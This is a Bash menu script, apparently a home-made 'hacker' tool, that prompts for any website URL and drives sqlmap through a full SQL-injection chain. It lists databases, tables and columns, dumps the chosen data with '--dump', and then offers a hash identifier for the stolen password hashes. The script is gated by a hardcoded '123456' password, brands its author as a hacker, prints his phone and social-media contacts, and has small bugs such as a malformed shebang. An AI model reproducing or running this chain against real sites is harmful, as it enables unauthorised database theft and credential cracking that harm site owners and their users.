#!bin/bash
clear
red='\e[1;31m'
green='\e[1;32m'
blue='\e[1;34m'
purple='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'
yellow='\e[1;33m'

figlet "Logen [~]"

echo -e $yellow "please insert the 
password login "
read welcome
if [ $welcome = "123456" ]
then
clear
echo ''
echo ''
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
echo -e $red
echo -e $yellow "      Hacker \ Mohammed Info"
echo ""
echo -e $red '           ///,        ////'
echo -e $red '           \  /,      /  >.'
echo -e $red '            \  /,   _/  /. '
echo -e $red '             \_  /_/   /. '
echo -e $red '              \__/_   <    F.Injection'
echo -e $white   '              /<<< \_\_      Yemen' 
echo -e $white   '             /,)^>>_._ \'
echo -e $white   '             (/   \\ /\\\ '
echo -e $white   '                   // ````'
echo -e $red '            ======((`======='

echo -e $green"###########################################"
echo -e $green "email: profionadhim@gmail.com"
echo -e $red   "-----------------------------"
echo -e $green "Facebook :www.fb.com/profionaldhim"
echo -e $red   "-----------------------------"
echo -e $green "Youtube  :Mohammed Info"
echo -e $red   "-----------------------------"
echo -e $green "whatsapp :+967733014747"
echo -e $red   "-----------------------------"
echo -e $green"--------------$yellow(2 in 1) -----------"
echo -e $yellow "By =====> $red HACKER / MOHAMMED Info "
echo ''
echo -e $green   "1- Injection Sqlmap"
echo ""
echo -e $green   "2- About me"
echo ""
echo -e $green   "0- EXIT |-|"
echo ""
echo ""
echo -e $green "Enter The Number:"
echo -e $red
echo ""
#################################

read name
if [ $name = 1 ]
then
clear
echo ''
echo ''
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
echo -e $red
echo -e $yellow "      Hacker \ Mohammed Info"
echo ""
echo -e $red '           ///,        ////'
echo -e $red '           \  /,      /  >.'
echo -e $red '            \  /,   _/  /. '
echo -e $red '             \_  /_/   /. '
echo -e $red '              \__/_   <    F.Injection'
echo -e $white   '              /<<< \_\_      Yemen' 
echo -e $white   '             /,)^>>_._ \'
echo -e $white   '             (/   \\ /\\\ '
echo -e $white   '                   // ````'
echo -e $red '            ======((`======='
echo -e $green"##########################################"
cd ~
cd sqlmap
echo -e $yellow "please insert web url"
read re
python2 sqlmap.py -u $re --dbs
echo -e $yellow "please insert database"
read data
python2 sqlmap.py -u $re -D $data --tables 
echo -e $yellow "please insert table"
read table
python2 sqlmap.py -u $re -D $data -T $table --columns
echo -e $yellow "please insert columns"
read columns
python2 sqlmap.py -u $re -D $data -T $table -C $columns --dump
echo -e $yellow "Do you want define type hash insert y/n "
read typehash
if [ $typehash = "y" ]
then
clear
cd ~
cd hash-identifier.py
python2 hash-identifier.py

else
bash Fastinjection.sh
fi
fi
if [ $name = 2 ]
then
clear
echo ''
echo ''
toilet -f term -F border --gay "fb : www.fb.com/profionaldhim"
echo -e $red
echo -e $yellow "      Hacker \ Mohammed Info"
echo ""
echo -e $red '           ///,        ////'
echo -e $red '           \  /,      /  >.'
echo -e $red '            \  /,   _/  /. '
echo -e $red '             \_  /_/   /. '
echo -e $red '              \__/_   <    F.Injection'
echo -e $white   '              /<<< \_\_      Yemen' 
echo -e $white   '             /,)^>>_._ \'
echo -e $white   '             (/   \\ /\\\ '
echo -e $white   '                   // ````'
echo -e $red '            ======((`======='
echo -e $green"#################################################"
echo -e $red   "      About me"
echo ""
echo -e $green "YOUTUBE: Mohammed Info "
echo ""
echo -e $green "FB: profionaldhim "
echo ""
echo -e $green "TWITTER: profionaldhim1 "
echo ""
echo -e $green "Whatsapp: 00967733014747"
echo ""
echo -e $green "00- Back"
echo ""
read about
if [ $about = 00 ]
then
clear
bash Fastinjection.sh
fi
fi
if [ $name = 0 ]
then
clear
figlet "GOOD BYE"
exit
fi
else
echo -e $red "wrong password retry .."

figlet "GOOD BYE"

exit
fi
